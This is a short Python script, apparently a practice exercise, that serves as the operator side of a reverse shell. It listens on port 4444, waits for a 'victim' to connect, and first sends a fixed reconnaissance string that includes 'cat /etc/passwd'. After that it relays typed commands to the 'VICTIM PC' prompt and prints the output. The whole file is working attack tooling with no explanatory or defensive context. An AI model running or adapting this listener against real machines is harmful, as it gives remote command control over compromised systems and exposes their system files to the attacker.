import socket

def main() :
	s = socket.socket()
	#socket.AF_INET, socket.SOCK_STREAM)
	s.bind(('127.0.0.1',4444))
	s.listen(1)
	print("Binding & Listening is done")	
	print("Waiting for accept")
	conn, addr = s.accept()
	print("Victim connected successfully")		
	run = True	
	command = "ls;pwd;cat /etc/passwd;echo $PATH"
	conn.send(command.encode())
	result = conn.recv(1024)
	print(result.decode('utf-8'))
	while run:
		command = input("VICTIM PC:/> ")
		conn.send(command.encode())
		if "close" in command :
		    run = False
		    conn.close()
		else :
		    result = conn.recv(1024)
		    print(result.decode('utf-8'))

main()
